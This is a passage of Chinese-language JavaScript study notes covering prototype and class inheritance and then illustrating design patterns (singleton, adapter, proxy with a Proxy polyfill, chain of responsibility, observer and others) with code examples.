          console.log(son.look('TV')) // father正在看TV
          ```
          缺点：所有实例都会继承原型上的属性。无法实现复用。（新实例属性都是后面添加的）
  
      6. 寄生式继承
  
          ```js
          function createObject(o){
              function fn(){}
              fn.prototype = o;
              return new fn();
          }
          var father = new Father();
          function Son(o){
              var son = createObject(o);
              son.name = 'son';
              return son;
          }
          var son = Son(father);
          console.log(son.sleep()) // son正在睡觉
          console.log(son.look('TV')) // son正在看TV
          ```
          缺点：没用到原型，无法复用。
  
      7. 最佳：寄生组合继承

          ConstructorB 如何继承 ConstructorA

          编写新的 constructor，将两个 constructor 通过 call/apply 的方式，合并它们的属性初始化。按照超类优先的顺序进行。

          取出超类和子类的原型对象，通过 Object.create/Object.setPrototypeOf 显式原型继承的方式，设置子类的原型为超类原型。
  
          ```js
          function createObject(o){
              function fn(){}
              fn.prototype = o;
              return new fn();
          }
          function Son(){
              Father.call(this)
          }
          Son.prototype = createObject(Father.prototype)
          Son.prototype.constructor = Son;
          var son = new Son('son');
          console.log(son.sleep()) // son正在睡觉
          console.log(son.look('TV')) // son正在看TV
          ```
  
      8. es6class继承
  
          ```js
          let Point = class Point {
              constructor(x, y) {
                  this.x = x;
                  this.y = y;
              }
  
              toString() {
                  return '(' + this.x + ', ' + this.y + ')';
              }
  
              //属性名
              [methodName]() {
  
              }
  
              //不可继承的静态方法
              static classMethod() {
                  return 'hello';
              }
  
              get prop() {
                  return 'getter';
              }
              set prop(value) {
                  console.log('setter: '+value);
              }
          }
  
          let ColorPoint = class ColorPoint extends Point {
              constructor(x, y, color) {
                  super(x, y); // 调用父类的constructor(x, y),super后才能使用this
                  this.color = color;
              }
  
              toString() {
                  return this.color + ' ' + super.toString(); // 调用父类的toString()
              }
          }
  
          let colorPoint = new ColorPoint(1,2,'red');
          console.log(colorPoint.toString());
          ```
  
          * class原理(使用babel理解)：组合寄生继承
  
          super() 等同于Parent.prototype.construtor()
  
          ```js
          class Parent {
              constructor(a){
                  this.filed1 = a;
              }
              filed2 = 2;
              func1 = function(){}
          }
          class Child extends Parent {
              constructor(a,b) {
                  super(a);
                  this.filed3 = b;
              }
              filed4 = 1;
              func2 = function(){}
          }
  
          function _classCallCheck(instance, Constructor) {
              // instanceof 检测构造函数的 prototype 属性是否出现在某个实例对象的原型链上。
              if (!(instance instanceof Constructor)) {
                  throw new TypeError("Cannot call a class as a function");
              }
          }
          var Parent = function Parent(a) {
              _classCallCheck(this, Parent);
  
              this.filed2 = 2;
  
              this.func1 = function () { };
  
              this.filed1 = a;
          };
          var Child = function (_Parent) {
              _inherits(Child, _Parent);
  
              function Child(a, b) {
                  _classCallCheck(this, Child);
  
                  var _this = _possibleConstructorReturn(this, (Child.__proto__ || Object.getPrototypeOf(Child)).call(this, a));
  
                  _this.filed4 = 1;
  
                  _this.func2 = function () {};
  
                  _this.filed3 = b;
                  return _this;
              }
  
              return Child;
          }(Parent);
          function _inherits(subClass, superClass) {
              if (typeof superClass !== "function" && superClass !== null) {
                  throw new TypeError("Super expression must either be null or a function, not " + typeof superClass);
              }
              subClass.prototype = Object.create(superClass && superClass.prototype, {
                  constructor: { value: subClass, enumerable: false, writable: true, configurable: true }
              });
              if (superClass)
                  Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass;
              }
          }
          ```
    
    * 设计模式总览
        1. 创建型模式
            * 抽象工厂模式
            * 生成器模式
            * 工厂方法模式
            * 单例模式
            * 原型模式
        2. 结构型模式
            * 适配器模式
            * 桥接模式
            * 组合模式
            * 装饰者模式
            * 外观模式
            * 享元模式
            * 代理模式
        3. 行为型模式
            * 责任链模式
            * 命令模式
            * 解释器模式
            * 迭代器模式
            * 中介者模式
            * 备忘录模式
            * 观察者模式
            * 状态模式
            * 策略模式
            * 模板方法模式
            * 访问者模式
    
    * 抽象工厂模式(接口)
    
        不需要建具体类，就可以对一堆类建模
        ```js
        class IHeroFactory {
            createAbilities() {}
            createEquipment() {}
            createSkills() {}
        }
    
        class SwordsmanFactory extends IHeroFactory {
            createAbilities() {
                return new SwordsmanAbility();
            }
            createEquipment() {
                return new SwordsmanEquipment();
            }
            createSkills() {
                return new SwordsmanSkill();
            }
        }
        //es5
        //function SwordsmanFactory(){}
        //SwordsmanFactory.prototype = new IHeroFactory();
        //SwordsmanFactory.prototype.createAbilities = function(){return new SwordsmanAbility();}
        ```
    
    * 生成器模式(构造函数)
    
        用于创建由其他对象组合构成的对象的模式，生成器知道所有的细节，且创建细节完全对其他相关类屏蔽。
        ```js
        class Person{
            constructor(name,age,job){
                this.name = name;
                this.age = age;
                this.job = "job:" + job;
                this.speak = function(){
                    console.log(this.name);
                };
            }
        }
        function Person(name,age,job){
            this.name = name;
            this.age = age;
            this.job = "job:" + job;
            this.speak = function(){
                console.log(this.name);
            };
        }
        var person1 = new Person("Alice", 23, "a");
        var person2 = new Person("Bruce", 22, "b");
        ```
    
    * 工厂模式
    
        把相同代码放到一个函数中，每次使用相同的功能或类，不需要重新编写代码
        ```js
        function createPerson(name, age) {
            var obj = {};
            obj.name = name;
            obj.age = age;
            obj.say = function () {
                console.log('hello' + this.name);
            }
            return obj;
        }
        var p1 = createPerson('aaa' , 26);
        p1.say();
        ```
    
    * 单例模式
    
        避免实例化多个对象
        ```js
        class People {
            constructor(name) {
                if (typeof People.instance === 'object') {
                    return People.instance;
                }
                People.instance = this;
                this.name = name;
                return this;
            }
        }
        var a = new People('a');//People {name: "a"}
        var b = new People('b');//People {name: "a"}
        console.log(a===b);//true
        //es5
        function People(name) {
            this.name = name;
        }
    
        People.getInstance = function(name) {
            if (!this.instance) {
                this.instance = new People(name);
            }
            return this.instance;
        }
    
        var a = People.getInstance('a');//People{name: "a"}
        var b = People.getInstance('b');//People{name: "a"}
        console.log(a===b);//true
    
        function Animal(name) {
            this.name = name
        }
    
        const AnimalSingle = (function () {
            let animalSingle = null
    
            return function (name) {
                if(animalSingle){
                    return animalSingle
                }
                return animalSingle = new Animal(name)
            }
        })();
    
        const animal1 = new AnimalSingle('dog')
        const animal2 = new AnimalSingle('cat')
    
        console.log(animal1.name); // dog
        console.log(animal2.name); // dog
        ```
    
    * 原型模式
    
        通过克隆或拷贝对象来生成对象,所有实例就共用了同一些方法或属性。
        ```js
        //写法1
        function Person(){
            Person.prototype.name = "aaa";
            Person.prototype.sayName = function(){
                alert(this.name);
            }
        };
        var person1 = new Person();
        person1.sayName();//"aaa"
        var person2 = new Person();
        person2.sayName();//"aaa"
    
        person1.name = "bbb";
        alert(person1.name);//bbb
        alert(person2.name);//aaa来自原型
        delete person1.name;
        alert(person1.name);//aaa来自原型
    
        //写法2
        var Person = {
            name: 'aaa',
            sayName: function(){
                alert(this.name);
            }
        };
        var person1 = Object.create(Person);
        person1.sayName();//"aaa"
        var person2 = Object.create(Person);
        person2.sayName();//"aaa"
    
        person1.name = "bbb";
        alert(person1.name);//bbb
        alert(person2.name);//aaa来自原型
        delete person1.name;
        alert(person1.name);//aaa来自原型
        ```
    
    * 适配器模式
    
        允许使用任何现有接口适配为目标接口
        ```js
        //方法适配
        var a = {
            say1: function(){
                console.log('a');
            }
        };
        var b = {
            say2: function(){
                console.log('b');
            }
        };
        var bAdapter = {
            say1: function(){
                return a.say1();
            }
        };
        var c = function(letter){
            if (letter.say1 instanceof Function){
                letter.say1();
            }
        };
        c(a);
        c(bAdapter);
    
        //数据适配
        let arr = ['a', 'b', 'c', 'd']
        function arr2objAdapter(arr) {
            return {
                e: arr[0],
                f: arr[1],
                g: arr[2],
                h: arr[3]
            }
        }
        let adapterData = arr2objAdapter(arr)；
        ```
    
    * 桥接模式
    
        提取多个底层功能模块，将抽象部分与它的实现部分分离
        ```js
        class Speed {
            constructor(x, y) {
                this.x = x
                this.y = y
            }
            run() {
                console.log(`运动起来 ${this.x} + ${this.y}`)
            }
        }
    
        class Color {
            constructor(cl) {
                this.color = cl
            }
            draw() {
                console.log(`绘制颜色 ${this.color}`)
            }
        }
    
        class Speak {
            constructor(wd) {
                this.word = wd
            }
            say() {
                console.log(`说话 ${this.word}`)
            }
        }
    
        class Ball {
            constructor(x, y, cl) {
                this.speed = new Speed(x, y)
                this.color = new Color(cl)
            }
            init() {
                this.speed.run()
                this.color.draw()
            }
        }
    
        class Man {
            constructor(x, y, wd) {
                this.speed = new Speed(x, y)
                this.speak = new Speak(wd)
            }
            init() {
                this.speed.run()
                this.speak.say()
            }
        }
    
        const man = new Man(1, 2, 'hehe?')
        man.init()
        ```
        ```js
        //一个事件的监听,点击元素获得id，根据获得的id我们发送请求查询对应id的猫
        element.addEventListener('click',getCatById)
        var getCatById = function(e){
          var id = this.id
          asyncRequst('Get',`cat.url?id=${id}`,function(resp){
              console.log('我已经获取了信息')
          })
        }
        //getCatById这个api函数我们可以理解为抽象 而点击这个过程是实现的效果
        //getCatById是一个只能工作在浏览器中的API,事件对象自然会被作为第一个参数传递给这个函数
        //任何一个API都不应该把它与任何特定环境搅在一起
        //改为：
        element.addEventListener('click',getCatByIdBridge)
        var getCatByIdBridge(e){ // getCatByIdBridge 桥接元素
            getCatById(this.id,function(cat){
                console.log('request cat')
            })
        }
        //getCatById这个API的使用范围就大大的拓宽了，没有与事件对象捆绑在了一起
        ```
    
    * 组合模式
    
        用小的子对象来构建更大的对象，以表示“部分-整体”的层次结构
        ```js
        //DOM树的整体与节点对象的部分，jquery的addClass是个例子
        var addClass = function (eles, className) {
            if (eles instanceof NodeList) {
                for (var i = 0, length = eles.length; i < length; i++) {
                    eles[i].nodeType === 1 && (eles[i].className += (' ' + className + ' '));
                }
            }
            else if (eles instanceof Node) {
                eles.nodeType === 1 && (eles.className += (' ' + className + ' '));
            }
            else {
                throw "eles is not a html node";
            }
        }
        addClass(document.getElementById("div3"), "test");
        addClass(document.querySelectorAll(".div"), "test");
        ```
    
    * 装饰模式
    
        不使用继承且在不改变对象现有结构的情况下添加附加功能
        ```js
        var decorator = function(input,fn){
            var button = document.getElementById('button1');
            if(typeof button.onclick === 'function'){
                var oldClickFn = button.onclick;
                button.onclick = function(){
                    oldClickFn();
                    fn();//不改变对象现有结构的情况下添加附加功能
                }
            }else{
                button.onclick = fn;
            }
        }
        ```
        ```js
        const kuanWrite = function() {
            this.writeChinese = function() {
                console.log('我只会写中文');
            };
        };
    
        // 通过装饰器给阿宽加上写英文的能力
        const Decorator = function(old) {
            this.oldWrite = old.writeChinese;
            this.writeEnglish = function() {
                console.log('给阿宽赋予写英文的能力');
            };
            this.newWrite = function() {
                this.oldWrite();
                this.writeEnglish();
            };
        };
    
        const oldKuanWrite = new kuanWrite();
        const decorator = new Decorator(oldKuanWrite);
        decorator.newWrite();
        ```
    
    * 外观模式
    
        为子系统的接口提供更高层次的接口
        ```js
        //高层次接口解决浏览器兼容性问题
        function addEvent(dom, type, fn) {
            if (dom.addEventListener) {
                dom.addEventListener(type, fn, false);
            }
            else if (dom.attachEvent) {
                dom.attachEvent('on' + type, fn);
            }
            else {
                dom['on' + type] = fn;
            }
        }
        const myInput = document.getElementById('myinput')
        addEvent(myInput, 'click', function() {console.log('绑定 click 事件')})
        ```
    
    * 享元模式
    
        主要用于减少创建对象的数量，以减少内存占用和提高性能
        ```js
        const Model = function(gender,underwear){
            this.gender = gender
            this.underwear = underwear
        }
        Model.prototype.takephoto = function(){
            console.log(`${this.gender}穿着${this.underwear}`);
        }
        for(let i=1;i<51;i++){
            const maleModel = new Model('male',`第${i}款衣服`)
            maleModel.takephoto()
        }
        for(let i =1;i<51;i++){
            const female = new Model('female',`第${i}款衣服`)
            female.takephoto()
        }
        //↓享元模式：只new了2个对象
        const Model = function(gender){
            this.gender = gender
        }
        Model.prototype.takephoto = function(){
            console.log(`${this.gender}穿着${this.underwear}`)
        }
        const maleModel = new Model('male')
        const femaleModel = new Model('female')
        for(let i =1;i<51;i++){
            maleModel.underwear = `第${i}款衣服`
            maleModel.takephoto()
        }
        for(let i =1; i<51;i++){
            femaleModel.underwear = `第${i}款衣服`
            femaleModel.takephoto()
        }
        //↓享元模式改进：引入工厂模式，但缺少了可读性
        const Model = function (gender) {
            this.gender = gender
        }
        Model.prototype.takephoto = function () {
            console.log(`${this.gender}穿着${this.underwear}`)
        }
        const modelFactory = (function () {
            const modelGender = {}
            return {
                createModel: function (gender) {
                    if (modelGender[gender]) {
                        return modelGender[gender]
                    }
                    return modelGender[gender] = new Model(gender)
                }
            }
        }())
        const modelManager = (function () {
            const modelObj = {}
            return {
                add: function (gender, i) {
                    modelObj[i] = {
                        underwear: `第${i}款衣服`
                    }
                    return modelFactory.createModel(gender)
                },
                copy: function (model, i) {
                    model.underwear = modelObj[i].underwear
                }
            }
        }())
        for (let i = 1; i < 51; i++) {
            const maleModel = modelManager.add('male', i)
            modelManager.copy(maleModel, i)
            maleModel.takephoto()
            console.log(maleModel,modelManager)
        }
        for (let i = 1; i < 51; i++) {
            const femaleModel = modelManager.add('female', i)
            modelManager.copy(femaleModel, i)
            femaleModel.takephoto()
            console.log(femaleModel,modelManager)
        }
        ```
    
    * 代理模式
    
        * 使用条件
    
            1. 模块职责单一且可复用
            2. 两个模块间的交互需要一定限制关系
    
        为一个对象找一个替代对象，以便对原对象进行访问限制
        ```js
        //虚拟代理是把一些开销很大的对象，延迟到真正需要它的时候才去创建执行
        // 图片懒加载
        var myImage = (function(){
            var imgNode = document.createElement('img')
            document.body.appendChild(imgNode)
            return {
                setSrc: function(src) {
                    imgNode.src = src
                }
            }
        })();
        var proxyImage = (function() {
            var img = new Image();
            img.onload = function() {
                myImage.setSrc(this.src)
            }
            return {
                setSrc: function(src) {
                    myImage.setSrc('blank.gif');//设置等待时的图片
                    img.src = src;//onload时才设置图片路径，实现懒加载
                }
            }
        })();
        proxyImage.setSrc('http://seopic.699pic.com/photo/40006/7735.jpg_wh1200.jpg')
    
        //缓存代理可以为一些开销大的运算结果提供暂时的存储，下次运算时，如果传递进来参数跟之前一致，则可以直接返回前面存储的运算结果。
        const getFib = (number) => {
            if (number <= 2) {
                return 1;
            }
            else {
                return getFib(number - 1) + getFib(number - 2);
            }
        }
        const getCacheProxy = (fn, cache = new Map()) => {
            //
            return new Proxy(fn, {
                apply(target, context, args) {
                    console.log(target, context, args)
                    //target为fn函数
                    //fn内没有属性，context为undefined
                    //args为传入的参数
                    const argsString = args.join(' ');
                    if (cache.has(argsString)) {
                        // 如果有缓存,直接返回缓存数据
                        return cache.get(argsString);
                    }
                    const result = fn(...args);
                    cache.set(argsString, result);
    
                    return result;
                }
            })
        }
        const getFibProxy = getCacheProxy(getFib);
        getFibProxy(40);
        ```
    
        附Proxy使用方法：
        * Proxy(代理对象，对象(属性为自定义代理函数))
        * 代理函数：(target为要代理的对象,propKey为对象属性值,value为值,receiver为Proxy或继承Proxy的对象)
            * get(target, propKey, receiver)：拦截对象属性的读取，比如proxy.foo和proxy['foo']。
            * set(target, propKey, value, receiver)：拦截对象属性的设置，比如proxy.foo = v或proxy['foo'] = v，返回一个布尔值。
            * has(target, propKey)：拦截propKey in proxy的操作，返回一个布尔值。
            * deleteProperty(target, propKey)：拦截delete proxy[propKey]的操作，返回一个布尔值。
            * ownKeys(target)：拦截Object.getOwnPropertyNames(proxy)Object.getOwnPropertySymbols(proxy)、Object.keys(proxy)、for...in循环，返回一个数组。该方法返回目标对象所有自身的属性的属性名，而Object.keys()的返回结果仅包括目标对象自身的可遍历属性。
            * getOwnPropertyDescriptor(target, propKey)：拦截Object.getOwnPropertyDescriptor(proxy, propKey)，返回属性的描述对象。
            * defineProperty(target, propKey, propDesc)：拦截Object.defineProperty(proxy, propKey, propDesc）、Object.defineProperties(proxy, propDescs)，返回一个布尔值。
            * preventExtensions(target)：拦截Object.preventExtensions(proxy)，返回一个布尔值。
            * getPrototypeOf(target)：拦截Object.getPrototypeOf(proxy)，返回一个对象。
            * isExtensible(target)：拦截Object.isExtensible(proxy)，返回一个布尔值。
            * setPrototypeOf(target, proto)：拦截Object.setPrototypeOf(proxy, proto)，返回一个布尔值。如果目标对象是函数，那么还有两种额外操作可以拦截。
            * apply(target, object, args)：拦截 Proxy 实例作为函数调用的操作，比如proxy(...args)、proxy.call(object, ...args)、proxy.apply(...)。
            * construct(target, args)：拦截 Proxy 实例作为构造函数调用的操作，比如new proxy(...args)。
        * 样例
            ```js
            var obj = new Proxy({}, {
                get: function (target, propKey, receiver) {
                    console.log(`getting ${propKey}!`);
                    //让Object操作都变成函数行为
                    //Reflect对象的方法与Proxy对象的方法一一对应，只要是Proxy对象的方法，就能在Reflect对象上找到对应的方法。这就让Proxy对象可以方便地调用对应的Reflect方法。
                    return Reflect.get(target, propKey, receiver);
                },
                set: function (target, propKey, value, receiver) {
                    console.log(`setting ${propKey}!`);
                    return Reflect.set(target, propKey, value, receiver);
                }
            });
            obj.count = 1
            //  setting count!
            ++obj.count
            //  getting count!
            //  setting count!
            //  2
            ```
    
        proxy与defineProperty对比
        * Proxy可以直接监听对象而非属性，Proxy可以劫持整个对象,并返回一个新对象
        * Proxy可以直接监听数组的变化，对数组进行操作(push、shift、splice等)时，会触发对应的方法名称和length的变化
        * Proxy有多达13种拦截方法,不限于apply、ownKeys、deleteProperty、has
        * Proxy时es6语法，不兼容低版本浏览器，如ie9

        proxy polyfill
        ```js
        if(!this.Proxy){
          (function(window){
            var seq=0;
            var dfGetter=function(target, property, receiver){
              return target[property];
            };
            var dfSetter=function(target, property, value,  receiver){
              target[property]=value;
            };
            var afterRevoke=function(){
              throw "illegal operation attempted on a revoked proxy";
            };
            if(Object.defineProperties){
              window.Proxy=function(target, handler){
                var me=this;
                if(!handler.get){
                  handler.get=dfGetter;
                }
                if(!handler.set){
                  handler.set=dfSetter;
                }
                Object.keys(target).forEach(function(key){
                  Object.defineProperty(me,key,{
                    enumerable:true,
                    get:function(){
                      return handler.get(target,key,me);
                    },
                    set:function(value){
                      if(handler.set(target,key,value,me)===false){
                        throw new TypeError("'set' on proxy: trap returned falsish for property '"+key+"'");
                      }
                    }
                  });
                });
              };
            }else if(window.execScript){
              //从avalon学到的方式，通过VB
              window.VBProxySetter=function(target, property, value, receiver, handler){
                if(handler.set(target, property, value, receiver)===false){
                  throw new TypeError("'set' on proxy: trap returned falsish for property '"+key+"'");
                }
              };
              window.VBProxyGetter=function(target,property, receiver, handler){
                return handler.get(target,property, receiver);
              };
              window.VBProxyPool=new Map();
              window.VBProxyFactory=function(target,handler){
                var className=VBProxyPool.get(target);
                if(!className){
                  className="VBClass_"+(seq++);
                  VBProxyPool.set(target,className);
                  var buffer=["Class "+className];
                  buffer.push('Public [__target__]');
                  buffer.push('Public [__handler__]');
                  Object.keys(target).forEach(function(key){
                    if(key.match(/[a-zA-Z0-9_$]/)){
                      buffer.push(
                        'Public Property Let ['+key+'](var)',
                        '	Call VBProxySetter([__target__],"'+key+'",var,Me,[__handler__])',
                        'End Property',
                        'Public Property Set ['+key+'](var)',
                        '	Call VBProxySetter([__target__],"'+key+'",var,Me,[__handler__])',
                        'End Property',
                        'Public Property Get ['+key+']',
                        '	On Error Resume Next', //必须优先使用set语句,否则它会误将数组当字符串返回
                        '	Set ['+key+']=VBProxyGetter([__target__],"'+key+'",Me,[__handler__])',
                        '	If Err.Number <> 0 Then',
                        '		['+key+']=VBProxyGetter([__target__],"'+key+'",Me,[__handler__])',
                        '	End If',
                        '	On Error Goto 0',
                        'End Property');
                    }
                  });
                  buffer.push('End Class');
                  buffer.push(
                    'Function '+className+'_Factory(target,handler)',
                    '	Dim o',
                    '	Set o = New '+className,
                    '	Set o.[__target__]=target',
                    '	Set o.[__handler__]=handler',
                    '	Set '+className+'_Factory=o',
                    'End Function'
                  );
                  try{
                    window.execScript(buffer.join('\n'), 'VBScript');
                  }catch(e){
                    alert(buffer.join('\n'));
                  }
                }
                return window[className+'_Factory'](target,handler); //得到其产品
              };
              window.Proxy=function(target, handler){
                if(!handler.get){
                  handler.get=dfGetter;
                }
                if(!handler.set){
                  handler.set=dfSetter;
                }
                var me=VBProxyFactory(target,handler);
                return me;
              };
            }
            Proxy.revocable=function(target,handler){
              var r={};
              r.proxy=new Proxy(target,handler);
              r.revoke=function(){
                handler.get=handler.set=afterRevoke;
              };
              return r;
            };
          })(this);
        }
        ```
    
    * 责任链模式
    
        * 定义
    
            避免请求发送者与接收者耦合在一起，让多个对象都有可能接收请求，将这些对象连接成一条链，并且沿着这条链传递请求，直到有对象处理它为止。
    
        * 好处
    
            1. 解耦了各节点关系，之前的方式是 A 里边要写 B，B 里边写 C，但是这里不同了，可以在 B 里边啥都不写
            2. 各节点灵活拆分重组
    
        * 使用条件
    
            1. 负责的是一个完整流程，或你只负责流程中的某个环节
            2. 各环节可复用
            3. 各环节有一定的执行顺序
            4. 各环节可重组
    
        * 例子1
    
        多个对象递进处理数据，处理完成则返回结果，不能处理则传递到下一层。可用于优化多重嵌套的if-else
        ```js
        var order = function(orderType, isPaid, stock) {
            if(orderType === 1) {
                if(isPaid) {
                    console.log("500元定金预购，得到100优惠券");
                }
                else {
                    if(stock > 0) {
                        console.log("普通购买，无优惠券");
                    }
                    else {
                        console.log("库存不足");
                    }
                }
            }
            else if(orderType === 2) {
                if(isPaid) {
                    console.log("200元定金预购，得到50优惠券");
                }
                else {
                    if(stock > 0) {
                        console.log("普通购买，无优惠券");
                    }
                    else {
                        console.log("库存不足");
                    }
                }
            }
            else {
                if(stock > 0) {
                    console.log("普通购买，无优惠券");
                }
                else {
                    console.log("库存不足");
                }
            }
        }
        order(1, true, 500);
        //↓责任链模式
        var order500 = function(orderType, isPaid, stock) {
            if(orderType === 1 && isPaid === true) {
                console.log("500元定金预购，得到100优惠券");
            }
            else {
                return "next";
            }
        };
        var order200 = function(orderType, isPaid, stock) {
            if(orderType === 2 && isPaid === true) {
                console.log("200元定金预购，得到50优惠券");
            }
            else {
                return "next";
            }
        };
        var orderNormal = function(orderType, isPaid, stock) {
            if(stock > 0) {
                console.log("普通购买，无优惠券");
            }
            else {
                console.log("库存不足");
            }
        };
        Function.prototype.after = function(fn) {
            var self = this;
            return function() {
                var result = self.apply(this, arguments);
                if(result === "next") {
                    return fn.apply(this, arguments);
                }
                return result;
            };
        }
        var order = order500.after(order200).after(orderNormal);
        order(1, true, 500);
        ```
    
        * 例子2
    
            耦合写法：上一个成功，才能执行下一个
            ```js
            function applyDevice(data) {
                // 处理巴拉巴拉...
                let devices = {};
                let nextData = Object.assign({}, data, devices);
                // 执行选择收货地址
                selectAddress(nextData);
            }
    
            function selectAddress(data) {
                // 处理巴拉巴拉...
                let address = {};
                let nextData = Object.assign({}, data, address);
                // 执行选择责任人
                selectChecker(nextData);
            }
    
            function selectChecker(data) {
                // 处理巴拉巴拉...
                let checker = {};
                let nextData = Object.assign({}, data, checker);
                // 还有更多
            }
            ```
            责任链
            ```js
            const Chain = function(fn) {
                this.fn = fn;
                this.setNext = function() {}
                this.run = function() {...}
            }
    
            const applyDevice = function() {...}
            const chainApplyDevice = new Chain(applyDevice);
    
            const selectAddress = function() {...}
            const chainSelectAddress = new Chain(selectAddress);
    
            const selectChecker = function() {...}
            const chainSelectChecker = new Chain(selectChecker);
    
            // 运用责任链模式实现上边功能
            chainApplyDevice.setNext(chainSelectAddress).setNext(chainSelectChecker);
            chainApplyDevice.run();
            ```
            额外新增的步骤
            ```js
            const applyLincense = function() {...}
            const chainApplyLincense = new Chain(applyLincense);
    
            const selectChecker = function() {...}
            const chainSelectChecker = new Chain(selectChecker);
    
            // 运用责任链模式实现上边功能
            chainApplyLincense.setNext(chainSelectChecker);
            chainApplyLincense.run();
            ```
    
    * 命令模式
    
        客户方需要向接收方发送一系列指令，此时希望用一种松耦合的方式来设计程序，使得指令列表形成一个队列，可以方便地实现指令记入日志、指令撤销重做以及接收方决定是否执行指令。
        ```js
        var up = {
            execute: function(){
                console.log('up');
            }
        };
        var down = {
            execute: function(){
                console.log('down');
            }
        };
        var left = {
            execute: function(){
                console.log('left');
            }
        };
        var right = {
            execute: function(){
                console.log('right');
            }
        };
        var command = function(){
            return {
                commandsList: [],
                add: function(command){
                    this.commandsList.push(command);
                },
                execute: function(){
                    let command;
                    while(command = this.commandsList.shift()){
                        command.execute();
                    }
                }
            }
        };
        var c = command();
        c.add(up);
        c.add(down);
        c.add(left);
        c.execute();
        ```
    
    * 解释器模式
    
        将数据的一种表示转换为另一种表示
        ```js
        function Context() {
            this.sum = 0;
            this.list = [];
            this.getSum = function() {
                return this.sum;
            }
            this.setSum = function(sum) {
                this.sum = sum;
            }
            this.add = function(eps) {
                this.list.push(eps);
            }
            this.getList = function() {
                return this.list;
            }
        }
    
        function PlusExpression() {
            this.interpret = function(context) {
                let sum = context.getSum();
                sum++;
                context.setSum(sum);
            }
        }
    
        function MinusExpression() {
            this.interpret = function(context) {
                let sum = context.getSum();
                sum--;
                context.setSum(sum);
            }
        }
    
        let context = new Context();
        context.setSum(20);
        context.add(new PlusExpression());
        context.add(new PlusExpression());
        context.add(new MinusExpression());
        let list = context.getList();
        for (let i = 0; i < list.length; i++)
        {
            let expression = list[i];
            expression.interpret(context);
        }
        console.log(context.getSum());
        ```
    
    * 迭代器模式
    
        提供统一的方式来循环遍历这些不同类型的集合(Array，ArrayList和HashTable)
        ```js
        class Iterator {
            constructor(container) {
                this.list = container.list;
                this.index = 0;
            }
            next() {
                if (this.hasNext()) {
                    return this.list[this.index++];
                }
                return null;
            }
            hasNext() {
                if (this.index >= this.list.length) {
                    return false;
                }
                return true;
            }
        }
    
        class Container {
            constructor(list) {
                this.list = list;
            }
            getIterator() {
                return new Iterator(this);
            }
        }
    
        let arr = [1, 2, 3, 4, 5, 6];
        let container = new Container(arr);
        let iterator = container.getIterator()
        while(iterator.hasNext()){
            console.log(iterator.next())
        }
        ```
    
    * 中介者模式
    
        通信由中介者完成，通信双方不需要了解对方的任何信息。中介者模式的作用就是解除对象与对象之间的紧耦合关系。对象与对象中的通信以中介者为媒介触发。中介者使各对象之间耦合松散，而且可以独立地改变它们之间的交互。中介者模式使网状的多对多关系变成了相对简单的一对多关系。
        ```js
        function A(mediator) {
            this.mediator = mediator;
        }
        A.prototype = {
            send: function(msg,receiver) {
                this.mediator.send(msg,'A',receiver);
            },
            receiveMsg: function(msg,sender) {
                console.log(sender+" say:"+msg)
            }
        }
    
        function B(mediator) {
            this.mediator = mediator;
        }
        B.prototype = {
            send: function(msg,receiver) {
                this.mediator.send(msg,'B',receiver);
            },
            receiveMsg: function(msg,sender) {
                console.log(sender+" say:"+msg)
            }
        }
        function Mediator() {
            this.A = new A(this);
            this.B = new B(this);
        }
        Mediator.prototype = {
            send: function(msg,sender,receiver) {
                try {
                    this[receiver].receiveMsg(msg,sender);
                }
                catch(err) {
                    console.log('receiver '+receiver+' is not exsit');
                    this[sender].receiveMsg('receiver '+ receiver +' is not exsit','mediator');
                }
            }
        }
    
        var _mediator = new Mediator();
        var _a = new A(_mediator);
        var _b = new B(_mediator);
        _a.send('hello i am A','B');
        _b.send('hello i am B','A');
        ```
    
    * 备忘录模式
    
        在不破坏对象的封装性的前提下，在对象之外捕获并保存该对象内部的状态以便日后对象使用或者对象恢复到以前的某个状态
        ```js
        // 分页缓存伪代码
        var Page = function () {
            // 通过cache对象缓存数据
            var cache = {}
            return function (page, fn) {
                if (cache[page]) {
                    showPage(page, cache[page])
                }
                else {
                    $.post('/url', function (data) {
                        showPage(page, data)
                        cache[page] = data
                    })
                }
                fn && fn()
            }
        }
        ```
    
    * 观察者模式
    
        当一个对象的状态发生变化时，能够自动通知其他关联对象，自动刷新对象状态
        ```js
        class PubSub {
            constructor() {
                this.handles = {};
            }
    
            // 订阅事件
            on(eventType, handle) {
                if (!this.handles.hasOwnProperty(eventType)) {
                    this.handles[eventType] = [];
                }
                if (typeof handle == 'function') {
                    this.handles[eventType].push(handle);
                }
                else {
                    throw new Error('缺少回调函数');
                }
                return this;
            }
    
            // 发布事件
            emit(eventType, ...args) {
                if (this.handles.hasOwnProperty(eventType)) {
                    this.handles[eventType].forEach((item, key, arr) => {
                        item.apply(null, args);
                    })
                }
                else {
                    throw new Error(`"${eventType}"事件未注册`);
                }
                return this;
            }
    
            // 删除事件
            off(eventType, handle) {
                if (!this.handles.hasOwnProperty(eventType)) {
                    throw new Error(`"${eventType}"事件未注册`);
                }
                else if (typeof handle != 'function') {
                    throw new Error('缺少回调函数');
                }
                else {
                    this.handles[eventType].forEach((item, key, arr) => {
                        if (item == handle) {
                            arr.splice(key, 1);
                        }
                    })
                }
                return this; // 实现链式操作
            }
        }
    
        let callback = function () {
            console.log('you are so nice');
        }
    
        let pubsub = new PubSub();
        pubsub.on('completed', (...args) => {
            console.log(args.join(' '));
        }).on('completed', callback);
    
        pubsub.emit('completed', '1', '2', '3');
        pubsub.off('completed', callback);
        pubsub.emit('completed', '4', '5');
        ```
    
        * 使用条件
    
            1. 各模块相互独立
            2. 存在一对多的依赖关系
            3. 依赖模块不稳定、依赖关系不稳定
            4. 各模块由不同的人员、团队开发
    
        * 使用场景
    
            对接方模块逻辑修改或未写完，导致我方代码被迫修改函数调用名或注释
    
        * 缺点
    
            过多的使用发布订阅，就会导致难以维护调用关系
    
        * 例子
    
        ```js
        const EventEmit = function() {
            this.events = {};
            this.on = function(name, cb) {
                if (this.events[name]) {
                    this.events[name].push(cb);
                } else {
                    this.events[name] = [cb];
                }
            };
            this.trigger = function(name, ...arg) {
                if (this.events[name]) {
                    this.events[name].forEach(eventListener => {
                        eventListener(...arg);
                    });
                }
            };
        };
        //业务
        let event = new EventEmit();
        event.trigger('success');
        MessageCenter.fetch() {
            event.on('success', () => {
                console.log('更新消息中心');
            });
        }
        Order.update() {
            event.on('success', () => {
                console.log('更新订单信息');
            });
        }
        Checker.alert() {
            event.on('success', () => {
                console.log('通知管理员');
            });
        }
        ```
    
